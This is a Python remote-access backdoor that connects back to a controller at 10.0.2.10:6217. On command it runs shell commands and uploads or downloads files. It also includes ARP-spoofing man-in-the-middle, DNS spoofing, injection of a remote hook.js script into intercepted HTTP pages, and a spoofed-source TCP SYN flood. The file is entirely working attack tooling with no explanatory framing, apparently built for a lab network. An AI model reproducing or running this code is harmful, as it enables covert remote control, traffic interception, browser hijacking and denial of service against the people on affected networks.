#!/usr/bin/env python

import socket
import subprocess
import json
import os
import base64
import sys
from time import sleep
import multiprocessing
from ctypes import c_bool
import scapy.all as scapy
import re
import netfilterqueue
import random


def execute_system_command(command):
    return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)


def change_working_directory_to(path):
    os.chdir(path)
    return "[+] Changing working directory to " + path


def read_file(path):
    with open(path, "rb") as file:
        return base64.b64encode(file.read())


def write_file(path, content):
    with open(path, "wb") as file:
        file.write(base64.b64decode(content))
        return "[+] Upload successful."


# function that returns a list with responses from a broadcast
def broadcast(ip):
    arp_request = scapy.ARP(pdst=ip)
    brdcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = brdcast / arp_request

    # Send packets with custom Ether, send packet and receive response. "timeout": Time to wait for response
    return scapy.srp(arp_request_broadcast, timeout=2, retry=3, verbose=False)[0]


# function that scans network IPs
def network_scanner():
    route = re.findall(r'[0-9]+(?:\.[0-9]+){3}', str(scapy.conf.route))
    network, i = "0.0.0.0", 0
    while network == "0.0.0.0":
        network, netmask, machine_ip = route[4+i*4], route[5+i*4], route[7+i*4]
        i += 1
    if network and netmask:
        print('Network: {}'.format(network))
        print('Netmask: {}'.format(netmask))
        print("Machine's IP: {}".format(machine_ip))
        try:
            cidr = sum([bin(int(x)).count('1') for x in netmask.split('.')])
            scan_ip = network + '/' + str(cidr)
            final = []
            for _ in range(0, 5):
                temp = [ip[1].psrc for ip in broadcast(scan_ip)]
                if len(temp) > len(final):
                    final = temp
            print('[+] Network scan complete.')
            try:
                final.remove(machine_ip)
            except ValueError:
                pass
            return final
        except ValueError:
            print("[!] Something went wrong. Scan failed.")
            return
    else:
        print("[-] Could not read Network or Subnet Mask. Scan failed.")
        return


# function that returns MAC address of selected IP
def get_mac(ip):
    answered_mac = broadcast(ip)
    try:
        return answered_mac[0][1].hwsrc
    except IndexError:
        pass


# function that spoofs IPs
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


# function that restores the communication of two devices
def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)


# function that resets ARP tables and restores original connections
def cleanup(targets, src):
    for target_ip in targets:
        if target_ip != router_ip:
            restore(target_ip, src)
            restore(src, target_ip)
    print("[+] Done!")


# function that creates a Man in the Middle
def arp_spoof(targets, src):
    if SYS_PLATFORM == 'linux':
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write("1")
            while True:
                for target_ip in targets:
                    if target_ip != router_ip:
                        spoof(target_ip, src)
                        spoof(src, target_ip)
                sleep(2)
        except Exception:
            print("[!] Something went wrong ... Resetting ARP Tables...")
            cleanup(targets, src)
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write("0")


# function that modifies DNS layer packets
def process_packet_dns(packet, target_website, modified_ip):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname.decode("utf-8")
        if target_website in qname:
            answer = scapy.DNSRR(rrname=qname, rdata=modified_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))
    packet.accept()


# function that modifies HTTP layer packets
def process_packet_hook(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load.decode("utf-8", "ignore")
        load = load.replace("HTTP/1.1", "HTTP/1.0")
        if scapy_packet[scapy.TCP].dport == 80:
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
        elif scapy_packet[scapy.TCP].sport == 80:
            injection_code = '<script src="http://10.0.2.10:3000/hook.js"></script>'
            load = load.replace("</body>", "</body>" + injection_code)
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load.decode("utf-8", "ignore"):
            scapy_packet[scapy.Raw].load = load
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.TCP].chksum
            packet.set_payload(bytes(scapy_packet))
    packet.accept()


# function that spoofs a DNS response
def dns_spoof(target_website, modified_ip):
    subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(1,
               lambda packet, target_website=target_website, modified_ip=modified_ip:
               process_packet_dns(packet, target_website, modified_ip)
               )
    try:
        queue.run()
    except Exception:
        print("[!] Something went wrong ... FlUSHING IPTABLES...")
        subprocess.run(["iptables", "--flush"])
        print("[+] Done.")


# function that injects a hook
def hook():
    subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(1, process_packet_hook)
    try:
        queue.run()
    except Exception:
        print("[!] Something went wrong ... FlUSHING IPTABLES...")
        subprocess.run(["iptables", "--flush"])
        print("[+] Done.")


def kill_dns():
    if dns_process.is_alive():
        dns_process.terminate()
        print("[!] Dns process terminated ... FlUSHING IPTABLES...")
        subprocess.run(["iptables", "--flush"])
        print("[+] Done.")
    else:
        print('[-] No dns spoof running at the moment.')


def kill_hook():
    if hook_process.is_alive():
        hook_process.terminate()
        print("[!] Hook process terminated ... FlUSHING IPTABLES...")
        subprocess.run(["iptables", "--flush"])
        print("[+] Done.")
    else:
        print('[-] No Hook Injector running at the moment.')


def kill_arp():
    if arp_process.is_alive():
        try:
            kill_dns()
        except:
            pass
        try:
            kill_hook()
        except:
            pass
        arp_process.terminate()
        print("[!] Arp process terminated ... Resetting ARP Tables...")
        cleanup(selected, router_ip)
        if SYS_PLATFORM == 'linux':
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write("0")
    else:
        print('[-] No arp spoof running at the moment.')


def randomize_ip():
    iprange = router_ip.split('.')
    random_ip = iprange[0] + '.' + iprange[1] + '.' + iprange[2] + '.' + str(random.randrange(2, 254))
    return random_ip

def randomize_integer():
    random_int = random.randrange(1, 1024)
    return random_int


def flooding_tcp(port):
    for _ in range(flood_time):
        ip_packet = scapy.IP()
        ip_packet.src = randomize_ip()
        ip_packet.dst = flood_ip

        tcp_packet = scapy.TCP()
        tcp_packet.sport = randomize_integer()
        tcp_packet.dport = port
        tcp_packet.flags = "S"
        tcp_packet.seq = randomize_integer()
        tcp_packet.window = randomize_integer()

        scapy.send(ip_packet/tcp_packet, verbose=False)


class Backdoor:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.connected = multiprocessing.Value(c_bool, False)

    def reconnect(self):
        try:
            self.connection.close()
        except Exception:
            pass
        sleep(5)
        try:
            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.connection.connect((self.ip, self.port))
            self.connected.value = True
        except Exception:
            self.connected.value = False

    # function that sends json objects through socket connection
    def reliable_send(self, data):
        try:
            json_data = json.dumps(data.decode('utf-8')).encode('utf-8')
        except UnicodeDecodeError:
            json_data = json.dumps(str(data)).encode('utf-8')
        except AttributeError:
            json_data = json.dumps(data).encode('utf-8')
        self.connection.send(json_data)

    # function that receives json objects through socket connection
    def reliable_receive(self):
        json_data = "".encode('utf-8')
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data.decode('utf-8'))
            except json.decoder.JSONDecodeError:
                continue

    def run(self):
        while True:
            while not self.connected.value:
                self.reconnect()
            while True:
                try:
                    command = self.reliable_receive()
                    if command[0] == "arpspoof":
                        try:
                            kill_arp()
                        except:
                            pass
                        try:
                            scan_result = network_scanner()
                            if scan_result:
                                if router_ip:
                                    global selected
                                    global arp_process
                                    selected = scan_result
                                    arp_process = multiprocessing.Process(target=arp_spoof, args=(selected, router_ip))
                                    print("[+] Initializing Arp Spoof...")
                                    arp_process.start()
                                else:
                                    print("[-] Router IP not found. Choose manually..")
                        except:
                            pass
                    elif command[0] == 'dnsspoof':
                        try:
                            kill_dns()
                        except:
                            pass
                        try:
                            if arp_process and arp_process.is_alive():
                                try:
                                    kill_hook()
                                except:
                                    pass
                                target_website = command[1]
                                modified_ip = command[2]
                                global dns_process
                                dns_process = multiprocessing.Process(target=dns_spoof,
                                                                      args=(target_website, modified_ip))
                                print("[+] Initializing Dns Spoof...")
                                sleep(0.1)
                                dns_process.start()
                            else:
                                print('[-] No arp spoof running at the moment.')
                        except:
                            print('[-] No arp spoof running at the moment.')
                    elif command[0] == 'hook':
                        try:
                            kill_hook()
                        except:
                            pass
                        try:
                            if arp_process and arp_process.is_alive():
                                try:
                                    kill_dns()
                                except:
                                    pass
                                global hook_process
                                hook_process = multiprocessing.Process(target=hook)
                                print("[+] Initializing Hook Injector...")
                                time.sleep(0.1)
                                hook_process.start()
                            else:
                                print('[-] No arp spoof running at the moment.')
                        except NameError:
                            print('[-] No arp spoof running at the moment.')
                    elif command[0] == "tcpflood":
                        # try:
                        global flood_ip
                        global flood_time
                        flood_ip = command[1]
                        flood_ports = list(map(int, command[2].translate({ord(i): None for i in '[]'}).split(',')))
                        flood_time = int(command[3])
                        pool = multiprocessing.Pool(processes=len(flood_ports))
                        pool.map(flooding_tcp, flood_ports)
                        pool.close()
                        pool.join()
                        # except:
                        #     pass
                    elif command[0] == "killarp":
                        try:
                            kill_arp()
                        except:
                            pass
                    elif command[0] == "killdns":
                        try:
                            kill_dns()
                        except:
                            pass
                    elif command[0] == "killhook":
                        try:
                            kill_hook()
                        except:
                            pass
                    else:
                        try:
                            if command[0] == "exit":
                                pass
                            elif command[0] == "killconnection":
                                self.connected.value = False
                                break
                            elif command[0] == "PING":
                                command_result = "PONG"
                            elif command[0] == "cd" and len(command) > 1:
                                command_result = change_working_directory_to(command[1])
                            elif command[0] == "download":
                                command_result = read_file(command[1])
                            elif command[0] == "upload":
                                command_result = write_file(command[1], command[2])
                            else:
                                command_result = execute_system_command(command)
                        except Exception:
                            command_result = "[-] Error during command execution."
                        self.reliable_send(command_result)
                except OSError:
                    self.connected.value = False
                    break


try:
    SYS_PLATFORM = sys.platform
    selected = []
    arp_process = None
    dns_process = None
    hook_process = None
    flood_ip = None
    flood_time = None
    router_ip = scapy.conf.route.route("0.0.0.0")[2]
    my_backdoor = Backdoor("10.0.2.10", 6217)
    my_backdoor.run()
except Exception:
    sys.exit()
